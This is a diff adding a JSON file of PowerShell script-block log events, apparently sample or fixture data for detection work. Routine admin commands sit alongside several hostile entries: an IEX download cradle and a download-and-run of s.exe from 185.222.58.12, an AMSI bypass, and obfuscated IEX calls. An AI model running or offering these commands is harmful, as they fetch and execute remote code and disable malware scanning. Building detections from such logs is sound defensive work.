@@ -1,0 +1,83 @@
+[
+  {
+    "TimeCreated": "2026-03-02T08:14:21.118Z",
+    "Id": 4104,
+    "LogName": "Microsoft-Windows-PowerShell/Operational",
+    "Level": "Verbose",
+    "Computer": "FIN-WKSTN-07",
+    "UserId": "MERIDIAN\\jsmith",
+    "ScriptBlockText": "Get-ChildItem 'C:\\Users\\jsmith\\Documents' -Recurse | Measure-Object"
+  },
+  {
+    "TimeCreated": "2026-03-02T08:31:05.742Z",
+    "Id": 4104,
+    "LogName": "Microsoft-Windows-PowerShell/Operational",
+    "Level": "Verbose",
+    "Computer": "FIN-DC-01",
+    "UserId": "MERIDIAN\\svc-backup",
+    "ScriptBlockText": "Import-Module ActiveDirectory; Get-ADUser -Filter * -Properties LastLogonDate | Select-Object Name,LastLogonDate"
+  },
+  {
+    "TimeCreated": "2026-03-02T09:02:55.310Z",
+    "Id": 4104,
+    "LogName": "Microsoft-Windows-PowerShell/Operational",
+    "Level": "Verbose",
+    "Computer": "FIN-WKSTN-07",
+    "UserId": "MERIDIAN\\svc-patch",
+    "ScriptBlockText": "$ProgressPreference='SilentlyContinue'; Invoke-WebRequest -Uri 'https://patches.meridian.local/2026-03/cumulative.msi' -OutFile 'C:\\Windows\\Temp\\cumulative.msi'"
+  },
+  {
+    "TimeCreated": "2026-03-02T11:47:33.901Z",
+    "Id": 4104,
+    "LogName": "Microsoft-Windows-PowerShell/Operational",
+    "Level": "Warning",
+    "Computer": "FIN-WKSTN-07",
+    "UserId": "MERIDIAN\\jsmith",
+    "ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('http://185.222.58.12/a')"
+  },
+  {
+    "TimeCreated": "2026-03-02T11:47:34.052Z",
+    "Id": 4104,
+    "LogName": "Microsoft-Windows-PowerShell/Operational",
+    "Level": "Warning",
+    "Computer": "FIN-WKSTN-07",
+    "UserId": "MERIDIAN\\jsmith",
+    "ScriptBlockText": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
+  },
+  {
+    "TimeCreated": "2026-03-02T11:48:02.444Z",
+    "Id": 4104,
+    "LogName": "Microsoft-Windows-PowerShell/Operational",
+    "Level": "Warning",
+    "Computer": "FIN-WKSTN-07",
+    "UserId": "MERIDIAN\\jsmith",
+    "ScriptBlockText": "(New-Object Net.WebClient).DownloadFile('http://185.222.58.12/s.exe', \"$env:TEMP\\s.exe\"); Start-Process \"$env:TEMP\\s.exe\""
+  },
+  {
+    "TimeCreated": "2026-03-02T11:49:18.677Z",
+    "Id": 4104,
+    "LogName": "Microsoft-Windows-PowerShell/Operational",
+    "Level": "Warning",
+    "Computer": "FIN-WKSTN-07",
+    "UserId": "MERIDIAN\\jsmith",
+    "ScriptBlockText": "$x=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBFAFgAIAAnAGgAZQBsAGwAbwAnAA==')); IEX $x"
+  },
+  {
+    "TimeCreated": "2026-03-02T12:05:41.220Z",
+    "Id": 4104,
+    "LogName": "Microsoft-Windows-PowerShell/Operational",
+    "Level": "Warning",
+    "Computer": "FIN-WKSTN-07",
+    "UserId": "MERIDIAN\\jsmith",
+    "ScriptBlockText": "& ([scriptblock]::Create([char]73+[char]69+[char]88+[char]32+[char]39+[char]104+[char]105+[char]39))"
+  },
+  {
+    "TimeCreated": "2026-03-02T13:20:09.555Z",
+    "Id": 4104,
+    "LogName": "Microsoft-Windows-PowerShell/Operational",
+    "Level": "Verbose",
+    "Computer": "FIN-WKSTN-12",
+    "UserId": "MERIDIAN\\acct-mfin",
+    "ScriptBlockText": "Get-Process | Sort-Object CPU -Descending | Select-Object -First 5"
+  }
+]
